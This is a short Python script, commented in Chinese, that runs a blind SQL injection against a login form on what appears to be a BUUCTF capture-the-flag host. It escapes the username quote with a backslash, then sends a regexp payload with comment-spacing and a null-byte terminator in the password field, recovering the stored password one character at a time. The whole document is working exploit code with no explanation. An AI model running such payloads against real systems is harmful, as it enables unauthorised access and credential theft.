#sql盲注(regexp)
import time
from urllib import parse
import requests
import string

url = 'http://b66fd46f-4f7c-4f2c-882a-7a4cb5d9e68e.node4.buuoj.cn:81/index.php'
s = requests.session()
string= string.ascii_lowercase + string.digits + '_'
password=''
for i in range(0,50):
    for j in string:
        j = password+j
        payload = {
            'username':'\\',
            'passwd':'||/**/passwd/**/regexp/**/"^{0}";{1}'.format(j,parse.unquote('%00'))
        }
        res = s.post(url=url,data=payload)
        print(payload)
        if 'welcome' in res.text:
            password = j
            print(password)
            break
        time.sleep(0.1)